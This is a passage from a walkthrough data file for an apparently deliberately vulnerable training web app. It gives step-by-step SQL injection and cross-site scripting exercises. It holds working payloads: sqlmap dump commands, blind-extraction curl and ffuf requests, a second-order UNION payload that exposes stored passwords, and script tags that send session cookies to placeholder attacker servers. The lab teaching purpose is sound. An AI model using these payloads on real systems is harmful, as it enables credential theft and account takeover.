                <p><strong>Why <code>--technique=B</code>?</strong> Without it, sqlmap tries UNION first, gets truncated output, and either fails or gives partial results. Boolean blind asks one yes/no question per request and does not care about output length.</p>
                <p><strong>Speed tip:</strong> Blind is slow. If you just need to confirm the vuln for your report, run without <code>--dump</code> first. Only dump when you actually need the data. Or use the <code>/products/search</code> endpoint for fast UNION extraction instead.</p>
                <p>You can also use <strong>ffuf</strong> for manual blind extraction like you did with the bb-labs exercise:</p>
                <pre>ffuf -u "http://localhost:5000/products/filter?category=Networking'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username%3D'admin'),1,1)%3D'FUZZ'--+" \\
  -w <(echo -e "a\nb\nc\nd\ne\nf\n1\n2\n3") \\
  -H "Cookie: session=YOUR_SESSION" \\
  -fs WRONG_SIZE</pre>`

        {
            id: "sqli-second-order",
            name: "Second-Order SQLi",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">This one is tricky. The injection does not fire immediately. Instead, malicious data is stored and executed later when another feature uses it.</p>
                <p>Go to <a href="/register" target="_blank">/register</a> and create a new account.</p>`,

                `<p class="wt-mentor-text">The registration safely stores your username. But what if the profile page uses that stored username in another SQL query without sanitizing it?</p>
                <p>The username you choose is saved, and when you view your profile, it gets used in a new query.</p>`,

                `<p class="wt-mentor-text">Here is the tricky part. The profile page runs this query with your stored username:</p>
                <pre>SELECT * FROM support_tickets WHERE user_id = (SELECT id FROM users WHERE username = 'YOUR_USERNAME')</pre>
                <p>Notice the subquery has a closing parenthesis <code>)</code>. Your payload needs to close that paren. Register with this username:</p>
                <pre>x') UNION SELECT 1,username,password,email,role,6,7 FROM users--</pre>
                <p>Use any password. The registration is safe (parameterized queries), so the payload just gets stored as-is.</p>
                <p><strong>Important:</strong> Do NOT try to log in with this username. The login query has 13 columns, not 7, so the UNION will break it. Instead, log in as a normal user (or use SQLi bypass like <code>agarcia'--</code>) and use IDOR to visit the malicious user's profile.</p>`,

                `<p class="wt-mentor-text">After registering, log in as any normal user. Then visit the malicious user's profile via IDOR: <code>/profile/USER_ID</code>.</p>
                <p>When the profile loads, the activity query fires:</p>
                <pre>SELECT * FROM support_tickets WHERE user_id = (SELECT id FROM users WHERE username = 'x') UNION SELECT 1,username,password,email,role,6,7 FROM users--')</pre>
                <p>The Recent Activity section now shows all usernames and passwords from the users table, disguised as "ticket" entries. You should see entries like:</p>
                <pre>Ticket: admin123 (admin)
Ticket: password123 (employee)
Ticket: Welcome1! (employee)</pre>
                <p>Those are passwords and roles, not ticket data.</p>`,

                `<p class="wt-mentor-text">This is called second-order SQLi because the payload is stored in step 1 (registration) but executed in step 2 (profile view). Two features, two different queries.</p>
                <p>The registration uses parameterized queries (safe), but the profile page builds a query using the stored username with string concatenation (unsafe). The key insight was closing the subquery parenthesis with <code>')</code> before adding the UNION.</p>
                <p><strong>Can you automate this with sqlmap?</strong> No. Sqlmap's <code>--second-url</code> flag exists for second-order SQLi, but it cannot handle the multi-step chain here (register, then log in as a different user, then visit the new user's profile via IDOR). This is a manual-only finding. That is exactly why second-order SQLi is rated Hard.</p>
                <p>The key lesson: every query that uses stored data needs to be parameterized, not just the ones that directly handle user input.</p>`,

                `<div class="wt-try-box">
                    <a href="/register" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-person-plus"></i> Go to Register</a>
                </div>
                <p class="mt-3"><strong>Steps summary:</strong></p>
                <ol>
                    <li>Register with username: <code>x') UNION SELECT 1,username,password,email,role,6,7 FROM users--</code></li>
                    <li>Log in as a normal user (e.g. <code>agarcia</code> / <code>Welcome1!</code>)</li>
                    <li>Find the new user's ID (check <code>/admin</code> or try sequential IDs)</li>
                    <li>Visit <code>/profile/ID</code> to trigger the second-order injection</li>
                </ol>`
            ]
        },
        {
            id: "sqli-api-blind",
            name: "API Blind SQLi",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">APIs are just as vulnerable as web pages. Let's check the user lookup endpoint.</p>
                <p>The API has an endpoint at <code>/api/v1/users/check?username=admin</code>. It returns JSON: <code>{"exists": true}</code> or <code>{"exists": false}</code>.</p>`,

                `<p class="wt-mentor-text">That true/false response is perfect for blind SQLi. Try:</p>
                <p><code>/api/v1/users/check?username=admin' AND '1'='1</code> vs <code>admin' AND '1'='2</code>.</p>
                <p>If you get <code>true</code> for the first and <code>false</code> for the second, you have blind injection.</p>`,

                `<p class="wt-mentor-text">Use curl for API testing:</p>
                <pre>curl "http://localhost:5000/api/v1/users/check?username=admin'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username%3D'admin'),1,1)%3D'a'--+"</pre>
                <p>Or use sqlmap:</p>
                <pre>sqlmap -u "http://localhost:5000/api/v1/users/check?username=admin" --level=3 --technique=B --batch</pre>`,

                `<p class="wt-mentor-text">The JSON response toggles between true and false based on your injected condition. You can extract the entire database through this boolean channel.</p>`,

                `<p class="wt-mentor-text">API endpoints are often overlooked in security testing because they do not have a visible web interface. But they use the same backend queries and are just as vulnerable. Always test API parameters the same way you test form inputs.</p>`,

                `<div class="wt-try-box">
                    <p>Test with curl in your terminal:</p>
                    <pre>curl "http://localhost:5000/api/v1/users/check?username=admin"</pre>
                </div>`,

                `<p class="wt-mentor-text">sqlmap handles API endpoints just like web pages.</p>
                <pre>sqlmap -u "http://localhost:5000/api/v1/users/check?username=admin" \\
  --batch --level=3 --technique=B -T users --dump</pre>
                <p><strong>Important:</strong> Use <code>username=admin</code> (a known valid user), not <code>username=test</code>. sqlmap needs a "true" baseline to detect boolean differences. With <code>test</code>, the response is always <code>{"exists": false}</code> and sqlmap cannot distinguish true from false conditions. <code>--level=3</code> is needed because the default level does not try enough payload variants for this endpoint.</p>
                <p><strong>Cookie injection on other labs:</strong> Remember the bb-labs exercise where the session cookie was injectable? For that pattern:</p>
                <pre>sqlmap -u "http://target/page" \\
  --cookie="session=VULNERABLE_VALUE" \\
  -p session --batch --dump</pre>
                <p>The <code>-p</code> flag tells sqlmap which parameter to test. Works for cookies, headers, or URL params.</p>`
            ]
        }
    ]

{
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    icon: "bi-code-slash",
    badgeClass: "vuln-xss",
    description: "Inject JavaScript that runs in other users' browsers.",
    vulns: [
        {
            id: "xss-reflected-search",
            name: "Reflected XSS (Product Search)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">XSS is about injecting JavaScript into a page. Reflected XSS means your payload bounces right back in the response. Let's find one.</p>
                <p>Go to <a href="/products" target="_blank">Products</a> and use the search bar.</p>`,

                `<p class="wt-mentor-text">Search for something like <code>test</code> and look at the results page. Notice that your search term appears on the page: "Results for: test". Is it being escaped, or is it rendered as raw HTML?</p>
                <p>Try searching for <code>&lt;b&gt;test&lt;/b&gt;</code>. If "test" appears bold, the input is rendered as HTML.</p>`,

                `<p class="wt-mentor-text">Search for this:</p>
                <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
                <p>Or if script tags are filtered, try:</p>
                <pre>&lt;img src=x onerror=alert('XSS')&gt;</pre>`,

                `<p class="wt-mentor-text">You should see a JavaScript alert popup. That means your code executed in the browser. In a real attack, you would steal cookies, redirect users, or modify the page content.</p>`,

                `<p class="wt-mentor-text">The search query is reflected in the page using the <code>|safe</code> Jinja2 filter, which disables HTML escaping. Normally, Jinja2 auto-escapes output (turning &lt; into &amp;lt;), but <code>|safe</code> tells it "trust this content." When user input is marked as safe, XSS happens.</p>`,

                `<div class="wt-try-box">
                    <a href="/products/search?q=test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Product Search</a>
                </div>
                <p class="mt-3"><strong>Extra challenge:</strong> Craft a URL that steals cookies: <code>&lt;script&gt;document.location='http://YOUR_SERVER/?c='+document.cookie&lt;/script&gt;</code></p>`
            ]
        },
        {
            id: "xss-reflected-news",
            name: "Reflected XSS (News Tags)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">You found reflected XSS in the search box. Now let's hunt for more. The key technique: look at every URL parameter the app uses and check if its value appears on the page.</p>
                <p>Go to <a href="/news" target="_blank">News</a>. Click around and watch the URL bar. Do you see any query parameters like <code>?tag=</code>, <code>?category=</code>, or <code>?filter=</code>?</p>`,

                `<p class="wt-mentor-text">Navigate to <code>/news?tag=Technology</code>. The tag name appears somewhere on the page (maybe as a heading like "Posts tagged: Technology"). Now here is the method: right-click, View Source, and search for "Technology" in the HTML. Is your input inside an HTML tag attribute? Inside plain text? Inside a JavaScript block?</p>
                <p>Where the reflection appears determines what payload you need. If it is in plain HTML, try <code>?tag=&lt;b&gt;test&lt;/b&gt;</code>. If "test" appears bold, the input is rendered as raw HTML.</p>`,

                `<p class="wt-mentor-text">Confirmed - no escaping. Now escalate:</p>
                <pre>/news?tag=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
                <p>If script tags are stripped, try event handlers:</p>
                <pre>/news?tag=&lt;img src=x onerror=alert('XSS')&gt;</pre>`,

                `<p class="wt-mentor-text">The alert fires. Now think about exploitability: this is a URL you can send to someone. Craft a link like <code>http://thyhe.com/news?tag=&lt;script&gt;...&lt;/script&gt;</code>, and anyone who clicks it runs your JavaScript in their browser. That is why reflected XSS is exploitable even though the payload is not stored - the URL itself is the weapon.</p>`,

                `<p class="wt-mentor-text">URL parameters that get reflected on the page are the bread and butter of reflected XSS hunting. Your methodology: for every page, check the URL for parameters, view the page source, search for your input value, and test if it is escaped. Common culprits: <code>?search=</code>, <code>?tag=</code>, <code>?q=</code>, <code>?redirect=</code>, <code>?msg=</code>, <code>?error=</code>. Each one is worth a quick test.</p>`,

                `<div class="wt-try-box">
                    <a href="/news?tag=Technology" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-newspaper"></i> Go to News</a>
                </div>`
            ]
        },
        {
            id: "xss-reflected-error",
            name: "Reflected XSS (Error Page)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">Here is a hunting technique that many beginners miss: always check error pages. Developers build custom error pages to look nice, and they often pass the error message through a URL parameter. Those pages get less security review because they feel like "just error handling."</p>
                <p>Try visiting <code>/error?msg=Something went wrong</code>. How did you find this endpoint? In a real app, trigger errors on purpose (submit invalid data, visit broken links) and watch if the URL contains a <code>msg</code>, <code>error</code>, or <code>message</code> parameter.</p>`,

                `<p class="wt-mentor-text">The message appears on the page. View the source and search for "Something went wrong" in the HTML. Is it inside a <code>&lt;p&gt;</code> tag? Is there any encoding? Try <code>/error?msg=&lt;b&gt;test&lt;/b&gt;</code> - if "test" is bold, the parameter is rendered as raw HTML.</p>`,

                `<p class="wt-mentor-text">No escaping. Escalate:</p>
                <pre>/error?msg=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
                <p>This payload also works and is harder to spot in a URL because it uses URL encoding:</p>
                <pre>/error?msg=%3Cscript%3Ealert('XSS')%3C/script%3E</pre>`,

                `<p class="wt-mentor-text">The alert fires. Error pages are a favorite target in bug bounties because they are ubiquitous (every app has them) and often overlooked in security reviews. Developers mark them <code>|safe</code> because they want to display formatted HTML error messages like "The <b>email</b> field is required."</p>`,

                `<p class="wt-mentor-text">Add this to your testing checklist: whenever you find a custom error page, check for reflected XSS. Also try 404 pages (<code>/nonexistent-page</code>) - some apps reflect the requested path in the 404 message. And check pages that show "access denied" or "unauthorized" messages with URL parameters. These forgotten corners of an app are where easy XSS wins hide.</p>`,

                `<div class="wt-try-box">
                    <a href="/error?msg=Test%20error" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-exclamation-triangle"></i> Go to Error Page</a>
                </div>`
            ]
        },
        {
            id: "xss-stored-bio",
            name: "Stored XSS (Profile Bio)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Stored XSS is more dangerous than reflected because the payload persists. Anyone who views the page gets hit. Let's try the profile bio.</p>
                <p>Go to <a href="/profile/edit" target="_blank">Edit Profile</a>.</p>`,

                `<p class="wt-mentor-text">The bio field accepts free text. When you view a profile, the bio is displayed. Is it escaped? Check by entering some HTML like <code>&lt;b&gt;test&lt;/b&gt;</code> and viewing the profile.</p>`,

                `<p class="wt-mentor-text">Edit your bio to include:</p>
                <pre>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</pre>
                <p>Save it, then view your profile.</p>`,

                `<p class="wt-mentor-text">The alert fires every time anyone views your profile. The payload is stored in the database and executed for every visitor.</p>`,

                `<p class="wt-mentor-text">Stored XSS persists in the database. The bio is saved as-is and rendered with <code>|safe</code>. Unlike reflected XSS (which requires a crafted URL), stored XSS attacks everyone who views the affected page. This makes it higher severity.</p>`,

                `<div class="wt-try-box">
                    <a href="/profile/edit" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-pencil"></i> Go to Edit Profile</a>
                </div>`
            ]
        },
        {
            id: "xss-stored-review",
            name: "Stored XSS (Product Reviews)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Product reviews are user-generated content that gets displayed to every visitor. Anywhere users can write text that other users see is a stored XSS candidate.</p>
                <p>Go to <a href="/products" target="_blank">Products</a>, pick any product, and find the review form at the bottom of the detail page.</p>`,

                `<p class="wt-mentor-text">Before trying XSS payloads, do the quick HTML test. Submit a review with <code>&lt;b&gt;bold test&lt;/b&gt;</code> as the content. Then look at how your review appears on the page. Is "bold test" displayed in bold? If so, HTML is rendering - which means JavaScript will too.</p>
                <p>This two-step approach (test with harmless HTML first, then escalate) is cleaner than jumping straight to <code>&lt;script&gt;</code> tags. It also avoids triggering any basic WAF that might be looking for script tags.</p>`,

                `<p class="wt-mentor-text">Now let's learn a technique that bypasses basic script tag filters. Instead of <code>&lt;script&gt;</code>, use an image tag with an error handler:</p>
                <pre>&lt;img src=x onerror=alert('XSS in review')&gt;</pre>
                <p>How does this work? The browser tries to load an image from the URL "x". That fails (there is no image at "x"). When it fails, the browser fires the <code>onerror</code> event handler, which runs your JavaScript. This works because <code>onerror</code> is a legitimate HTML attribute that triggers JavaScript - the browser has no way to know you are using it maliciously.</p>`,

                `<p class="wt-mentor-text">The alert fires for every visitor who views this product page. Unlike reflected XSS where you need to trick someone into clicking a link, stored XSS fires automatically. Every customer browsing products gets hit.</p>
                <p>Refresh the page and the alert fires again - the payload is saved in the database permanently (until someone removes it).</p>`,

                `<p class="wt-mentor-text">The <code>&lt;img onerror&gt;</code> technique is essential to know because many apps filter <code>&lt;script&gt;</code> tags but forget about event handlers. Other useful event handler payloads: <code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;body onload=alert(1)&gt;</code>, <code>&lt;input onfocus=alert(1) autofocus&gt;</code>. There are dozens of HTML elements with event attributes that execute JavaScript. A blocklist approach can never catch them all.</p>`,

                `<div class="wt-try-box">
                    <a href="/products" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-star"></i> Go to Products</a>
                </div>`
            ]
        },
        {
            id: "xss-stored-ticket",
            name: "Stored XSS (Support Tickets)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Support tickets are read by staff. Imagine planting XSS that fires when an admin reads your ticket.</p>
                <p>Go to <a href="/support/create" target="_blank">Create a Support Ticket</a>.</p>`,

                `<p class="wt-mentor-text">The title and content fields are both rendered on the ticket view page. Are they escaped?</p>`,

                `<p class="wt-mentor-text">Create a ticket with this title:</p>
                <pre>&lt;script&gt;alert('XSS in ticket title')&lt;/script&gt;</pre>
                <p>And this content:</p>
                <pre>&lt;img src=x onerror=alert('XSS in ticket body')&gt;</pre>`,

                `<p class="wt-mentor-text">Both the title and body execute JavaScript. In a real scenario, this would steal the admin's session cookie when they open the ticket.</p>`,

                `<p class="wt-mentor-text">This is particularly dangerous because support tickets are typically read by higher-privileged users (support staff, admins). An attacker submits a ticket, the admin opens it, and the XSS steals their session. This can escalate a low-privilege account to admin access.</p>`,

                `<div class="wt-try-box">
                    <a href="/support/create" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-plus-circle"></i> Create a Ticket</a>
                </div>`
            ]
        },
        {
            id: "xss-stored-message",
            name: "Stored XSS (Messages)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Here is where stored XSS gets really dangerous: targeted attacks through private messages. Unlike reviews or comments (where you hit everyone), messages let you choose your victim.</p>
                <p>Think about who you want to target. The admin? A support agent? Go to <a href="/messages/send" target="_blank">Send Message</a>.</p>`,

                `<p class="wt-mentor-text">Before you send a payload, think about the attack chain. Your goal is not just to pop an alert - it is to steal the recipient's session cookie. Here is the plan:</p>
                <ol>
                    <li>Send a message with XSS that steals the cookie</li>
                    <li>The victim (say, admin) opens the message</li>
                    <li>Your JavaScript sends the admin's cookie to your server</li>
                    <li>You use that cookie to log in as admin</li>
                </ol>
                <p>To test if messages are vulnerable, first send a message with <code>&lt;b&gt;test&lt;/b&gt;</code> as the body. Then view the message - if "test" is bold, you have stored XSS.</p>`,

                `<p class="wt-mentor-text">For a proof of concept, send a message with:</p>
                <pre>&lt;script&gt;alert('Your messages are not safe')&lt;/script&gt;</pre>
                <p>For an actual cookie theft payload (in a real pentest with a listener on your machine):</p>
                <pre>&lt;script&gt;new Image().src='http://YOUR_IP:8888/?c='+document.cookie&lt;/script&gt;</pre>
                <p>The <code>new Image().src</code> trick makes the browser send a request to your server with the cookie in the URL, without any visible indication to the victim.</p>`,

                `<p class="wt-mentor-text">The alert fires (or the cookie gets sent) the moment the recipient opens your message. This is a targeted attack - you control who gets hit and when. The victim sees a normal-looking message in their inbox and has no reason to suspect anything.</p>`,

                `<p class="wt-mentor-text">This attack pattern - stored XSS in messages to steal admin sessions - is one of the most impactful and commonly reported chains in bug bounties. It combines a medium-severity finding (stored XSS) with account takeover (critical severity). When writing your report, always demonstrate the full chain, not just the alert box. Show that you can steal the cookie and use it. That is what bumps the severity from medium to critical.</p>`,
